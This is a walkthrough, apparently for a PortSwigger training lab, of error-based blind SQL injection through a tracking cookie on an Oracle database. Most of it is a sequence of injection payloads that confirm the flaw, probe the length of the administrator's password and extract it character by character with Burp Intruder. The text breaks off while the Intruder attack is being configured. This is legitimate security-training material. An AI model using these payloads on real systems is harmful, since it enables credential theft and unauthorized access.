This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Solution

!.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/33ff3329-dfbe-48e2-90b0-b65d5033bc1b)

2. Modify the TrackingId cookie, appending a single quotation mark to it:

> TrackingId=xyz'
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/dea37f1d-9561-41f0-807f-2f48053395ee)

Verify that an error message is received.

3. Now change it to two quotation marks:

> TrackingId=xyz''
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/6ee7b165-fb9c-461d-b220-534724aac27f)

Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.

4. We need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

> TrackingId=xyz'||(SELECT '')||'
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/fda7134e-52d2-4925-9733-938e4bcc6c8a)

In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

> TrackingId=xyz'||(SELECT '' FROM dual)||'
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/e05096ee-a751-45cc-86f4-a62173b71040)

As we no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

5. Now that we've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

> TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/95c1df7e-f108-457f-a5b7-13ea88ce4276)

This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

6. As long as we make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:

> TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/dd794d50-6e15-4065-94d0-9f5e19c2226f)

As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

7. We can also exploit this behavior to test conditions. First, submit the following query:

> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/cea540e8-8620-406b-bbcc-95dd5c27765c)

Verify that an error message is received.

8. Now change it to:

> TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/814cafb4-ccaa-4c7b-a7ea-466c0d113258)

Verify that the error disappears. This demonstrates that we can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

9. We can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:

> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e4d60368-7f62-4509-8a5d-3d5b962c58de)
  
Verify that the condition is true (the error is received), confirming that there is a user called administrator.   

10. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to

> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/55542113-e689-4487-ae33-3bcfe111c16a)

This condition should be true, confirming that the password is greater than 1 character in length.

11. Send a series of follow-up values to test different password lengths. Send:

> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/b9b42707-958a-42b5-87bb-1b803fee0b7a)

Then send:
> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7ad35703-1d84-497e-be64-94a582cba34c)

And so on. We can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.

12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so we need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

13. In the Positions tab of Burp Intruder, change the value of the cookie to:

> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a2846e28-f20d-4db5-9652-c6844a89ebbb)

 This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn. 

 14. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. We should then see the following as the cookie value (note the payload position markers):

> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/d68fc116-8737-4067-87c7-eeb5c8adfada)

15. To test the character at each position, we need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload settings" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

    ![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/524d43c9-225c-48e4-ad1b-c952fb48a63c)
    ![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/31ed7957-938e-4ae0-949a-3184ebb65b95)
    ![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/f10b2a7c-f78f-4454-a2ce-107f56d26dc7)

    ![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/99b4df6d-ad3a-4ec7-b1de-e37f6021d160)

